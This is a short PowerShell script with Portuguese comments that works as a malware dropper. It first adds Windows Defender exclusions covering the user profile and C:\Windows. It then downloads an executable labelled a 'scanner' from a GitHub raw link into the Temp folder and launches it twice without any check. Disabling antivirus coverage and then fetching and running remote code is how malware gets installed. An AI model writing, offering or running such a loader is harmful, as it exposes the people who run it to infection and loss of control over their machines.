# Adicionar exclusões no Windows Defender
Add-MpPreference -ExclusionPath $env:USERPROFILE
Add-MpPreference -ExclusionPath "C:\Windows"

# URL correta para download (substitua pelo link raw do GitHub)
$url = "https://github.com/Oqgpp/scanner/raw/refs/heads/main/scan.exe"
$output = "$env:Temp\testcod.exe"

# Fazer o download do executável
Invoke-WebRequest -Uri $url -OutFile $output

# Verificar se o arquivo foi baixado
if (Test-Path $output) {
    Write-Host "Arquivo baixado com sucesso em $output"
} else {
    Write-Host "Falha ao baixar o arquivo. Verifique o URL ou a conexão."
    exit
}

# Aguardar até que o arquivo esteja disponível (se necessário)
while (-not (Test-Path $output)) {
    Start-Sleep -Milliseconds 1000
    Write-Host "Aguardando download..."
}

# Executar o arquivo baixado
Start-Process -FilePath $output 
Start-Process -FilePath $output